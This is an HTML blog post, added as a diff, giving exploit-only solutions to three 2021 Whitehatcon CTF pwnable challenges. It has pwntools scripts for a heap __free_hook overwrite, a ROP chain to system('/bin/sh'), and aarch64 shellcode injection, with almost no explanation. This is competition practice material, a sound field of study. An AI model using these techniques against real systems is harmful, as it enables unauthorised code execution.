@@ -1,0 +1,501 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"pwnkidhn.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"manual","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="2021 Whitehatcontest CTF Write-up   I’m very happy that our team came in 24th in this CTF and i solve 3 problems. I write about it a month after the CTF. Actually i forgot how to solve them. that’s wh">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2021 Whitehatcon CTF">
+<meta property="og:url" content="https://pwnkidhn.github.io/2021/10/20/2021-10-21-whitehatcon_CTF_2021/index.html">
+<meta property="og:site_name" content="rvkhunLab">
+<meta property="og:description" content="2021 Whitehatcontest CTF Write-up   I’m very happy that our team came in 24th in this CTF and i solve 3 problems. I write about it a month after the CTF. Actually i forgot how to solve them. that’s wh">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-10-20T15:00:00.000Z">
+<meta property="article:modified_time" content="2021-10-21T12:53:50.834Z">
+<meta property="article:author" content="rvkhun">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="pwnable">
+<meta property="article:tag" content="write-up">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://pwnkidhn.github.io/2021/10/20/2021-10-21-whitehatcon_CTF_2021/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>2021 Whitehatcon CTF | rvkhunLab</title>
+  <meta name="google-site-verification" content="eBj8hDfb8V5sujjVERa_zAbaTQFLbQzowFQfUz3Rhw8">
+  <meta name="naver-site-verification" content="7c18a15cd138e9448d263381fe6201215fc40046">
+
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/rss2.xml" title="rvkhunLab" type="application/rss+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">rvkhunLab</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Write about System Hacking</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" placeholder="Searching..." spellcheck="false" type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://pwnkidhn.github.io/2021/10/20/2021-10-21-whitehatcon_CTF_2021/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/raccoon1.jpg">
+      <meta itemprop="name" content="rvkhun">
+      <meta itemprop="description" content="Security Researcher / CTF Player">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="rvkhunLab">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2021 Whitehatcon CTF
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2021-10-21 00:00:00 / Modified: 21:53:50" itemprop="dateCreated datePublished" datetime="2021-10-21T00:00:00+09:00">2021-10-21</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Write-up/" itemprop="url" rel="index"><span itemprop="name">Write-up</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <center>2021 Whitehatcontest CTF Write-up </center>
+
+<p>I’m very happy that our team came in 24th in this CTF and i solve 3 problems. I write about it a month after the CTF. Actually i forgot how to solve them. that’s why i need to check binary files again. but i lost binary files, could only find payload. So this post has only payload.TT</p>
+<span id="more"></span>
+
+<h2 id="chunk-manager"><a href="#chunk-manager" class="headerlink" title="chunk_manager"></a>chunk_manager</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./binary&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./binary&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allocMem</span>(<span class="params">idx,size</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size?\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printMem</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;\n&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fillMem</span>(<span class="params">idx,offset,data</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;\n&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;in:\n&#x27;</span>,<span class="built_in">str</span>(offset))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content:\n&#x27;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">freeMem</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;\n&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc</span></span><br><span class="line">allocMem(<span class="number">0</span>,<span class="number">0x20</span>)</span><br><span class="line">allocMem(<span class="number">1</span>,<span class="number">0x409</span>)</span><br><span class="line">allocMem(<span class="number">2</span>,<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">freeMem(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">41</span>,<span class="number">8</span>):</span><br><span class="line">    fillMem(<span class="number">0</span>,i,<span class="string">&#x27;PPPPPPPP&#x27;</span>)</span><br><span class="line"></span><br><span class="line">printMem(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">leak = u64(p.recvuntil(<span class="string">&#x27;\x0a&#x27;</span>)[-<span class="number">7</span>:-<span class="number">1</span>]+<span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libcbase = leak - <span class="number">0x3ebca0</span></span><br><span class="line">log.info(<span class="string">&quot;leak: &quot;</span>+<span class="built_in">hex</span>(leak))</span><br><span class="line">log.info(<span class="string">&quot;libcbase: &quot;</span> + <span class="built_in">hex</span>(libcbase))</span><br><span class="line"></span><br><span class="line">oneshot = <span class="number">0x10a41c</span> + libcbase</span><br><span class="line">oneshot = <span class="number">0x4f432</span> + libcbase</span><br><span class="line"><span class="comment">#oneshot = 0x4f3d5 + libcbase</span></span><br><span class="line">fillMem(<span class="number">0</span>,<span class="number">40</span>,p64(<span class="number">0x421</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#leak heap</span></span><br><span class="line">allocMem(<span class="number">3</span>,<span class="number">0x20</span>)</span><br><span class="line">allocMem(<span class="number">4</span>,<span class="number">0x20</span>)</span><br><span class="line">allocMem(<span class="number">5</span>,<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">freeMem(<span class="number">4</span>)</span><br><span class="line">freeMem(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">fillMem(<span class="number">0</span>,<span class="number">40</span>,<span class="string">&#x27;AAAAAAAC&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">printMem(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;C&#x27;</span>)</span><br><span class="line">leak = p.recvuntil(<span class="string">&#x27;\x0a&#x27;</span>)[:-<span class="number">1</span>]</span><br><span class="line">leak = u64(leak+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">8</span>-<span class="built_in">len</span>(leak)))</span><br><span class="line">log.info(<span class="string">&quot;heap: &quot;</span> +<span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line">fillMem(<span class="number">0</span>,<span class="number">40</span>,p64(<span class="number">0x31</span>))</span><br><span class="line">heapbase = leak - <span class="number">0xc0</span> + <span class="number">0x50</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="comment">#overwrite topchunk</span></span><br><span class="line"><span class="comment">#topchunk = leak + 0x410</span></span><br><span class="line">free_hook = libcbase + <span class="number">0x3ed8e8</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;free_hook: &quot;</span> + <span class="built_in">hex</span>(free_hook))</span><br><span class="line"><span class="comment">#log.info(&quot;top_chunk: &quot; + hex(topchunk))</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">fillMem(2,40,p64(0xffffffffffffffff))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">size = (free_hook - 0x20 - 0x10 - topchunk)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">allocMem(9,str(size))</span></span><br><span class="line"><span class="string">pause()</span></span><br><span class="line"><span class="string">allocMem(4,0x200)</span></span><br><span class="line"><span class="string">fillMem(4,0,&#x27;AAAAAAAAA&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">pause()</span></span><br><span class="line"><span class="string">printMem(1)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">pause()</span><br><span class="line">fillMem(<span class="number">0</span>,(free_hook-heapbase-<span class="number">0x10</span>),p64(oneshot))</span><br><span class="line"></span><br><span class="line">freeMem(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="string-manger"><a href="#string-manger" class="headerlink" title="string manger"></a>string manger</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./binary&#x27;)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./binary&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">copyString</span>(<span class="params">size</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;copy size ? &#x27;</span>,size)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modifyString</span>(<span class="params">data</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Content : &#x27;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmpString</span>(<span class="params">size</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;compare size ? &#x27;</span>,size)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert</span>(<span class="params">oneshot</span>):</span></span><br><span class="line">    oneshot = pack(<span class="string">&#x27;&gt;q&#x27;</span>,oneshot)</span><br><span class="line">    oneshot = oneshot[<span class="number">2</span>:]</span><br><span class="line">    oneshot = u64(<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">8</span>-<span class="built_in">len</span>(oneshot)) + oneshot)</span><br><span class="line">    <span class="keyword">return</span> oneshot</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span>*<span class="number">80</span></span><br><span class="line"></span><br><span class="line">modifyString(payload)</span><br><span class="line">pause()</span><br><span class="line">copyString(<span class="built_in">str</span>(<span class="number">55</span>))</span><br><span class="line">pause()</span><br><span class="line">cmpString(<span class="built_in">str</span>(<span class="number">55</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;string1 : &#x27;</span>)</span><br><span class="line">leak = p.recvuntil(<span class="string">&#x27; a&#x27;</span>)[-<span class="number">8</span>:-<span class="number">2</span>]</span><br><span class="line">leak = u64(leak+ <span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">8</span>-<span class="built_in">len</span>(leak)))</span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line">libcleak = pack(<span class="string">&#x27;&gt;q&#x27;</span>,leak)</span><br><span class="line">libcleak = libcleak[<span class="number">2</span>:]</span><br><span class="line">libcleak = u64(libcleak + <span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">8</span>-<span class="built_in">len</span>(libcleak)))</span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">hex</span>(libcleak))</span><br><span class="line"></span><br><span class="line">libcbase = libcleak - <span class="number">0x3fc39f</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;libcbase : &quot;</span> + <span class="built_in">hex</span>(libcbase))</span><br><span class="line">oneshot = libcbase + <span class="number">0x10a41c</span></span><br><span class="line">oneshot = libcbase + <span class="number">0x4f432</span></span><br><span class="line">oneshot = libcbase + <span class="number">0x4f3d5</span></span><br><span class="line"><span class="comment">#overwrite ret</span></span><br><span class="line">ret = libcbase + <span class="number">0x001d84d3</span></span><br><span class="line">system = libcbase + <span class="number">0x4f550</span></span><br><span class="line">binsh = libcbase + <span class="number">0x1b3e1a</span></span><br><span class="line">prdi = libcbase + <span class="number">0x0016609c</span></span><br><span class="line"></span><br><span class="line">system = convert(system)</span><br><span class="line">binsh = convert(binsh)</span><br><span class="line">prdi = convert(prdi)</span><br><span class="line">ret = convert(ret)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">oneshot = pack(&#x27;&gt;q&#x27;,oneshot)</span></span><br><span class="line"><span class="string">oneshot = oneshot[2:]</span></span><br><span class="line"><span class="string">oneshot = u64(b&#x27;\x00&#x27;*(8-len(oneshot)) + oneshot)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">print (hex(oneshot))</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;BBBB&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;AAAAAAAA&#x27;</span>*<span class="number">13</span></span><br><span class="line">payload += p64(system)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(prdi)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += <span class="string">b&#x27;E&#x27;</span></span><br><span class="line"></span><br><span class="line">modifyString(payload)</span><br><span class="line">copyString(<span class="built_in">str</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="am"><a href="#am" class="headerlink" title="am"></a>am</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process([&#x27;qemu-aarch64-static&#x27;,&#x27;-L&#x27;,&#x27;/usr/aarch64-linux-gnu&#x27;,&#x27;-g&#x27;,&#x27;1234&#x27;,&#x27;./am&#x27;])</span></span><br><span class="line"><span class="comment">#e = ELF(&#x27;./am&#x27;)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">main = <span class="number">0x400E14</span></span><br><span class="line"></span><br><span class="line">size = <span class="number">0x412078</span></span><br><span class="line">malloc = <span class="number">0x412088</span></span><br><span class="line">count = <span class="number">0x4120d8</span></span><br><span class="line">syscall = <span class="number">0x400938</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>,<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;AAAAAAAA&#x27;</span>*<span class="number">13</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;KEYWORD\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">leak = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[-<span class="number">4</span>:-<span class="number">1</span>]+<span class="string">b&#x27;\x00\x40\x00\x00\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">hex</span>(leak))</span><br><span class="line">stack = leak - <span class="number">0x78</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b&quot;\xe1\x45\x8c\xd2\x21\xcd\xad\xf2\xe1\x65\xce\xf2\x01\x0d\xe0\xf2\xe1\x8f\x1f\xf8\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xe0\x63\x21\x8b\xa8\x1b\x80\xd2\xe1\x66\x02\xd4&quot;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>,<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;\x90&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">payload += shellcode</span><br><span class="line">payload += <span class="string">b&#x27;\x90&#x27;</span>*(<span class="number">0x70</span>-<span class="built_in">len</span>(payload))</span><br><span class="line"><span class="comment">#payload += p64(0x04136b0)</span></span><br><span class="line">payload += p64(stack)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;KEYWORD\n&#x27;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
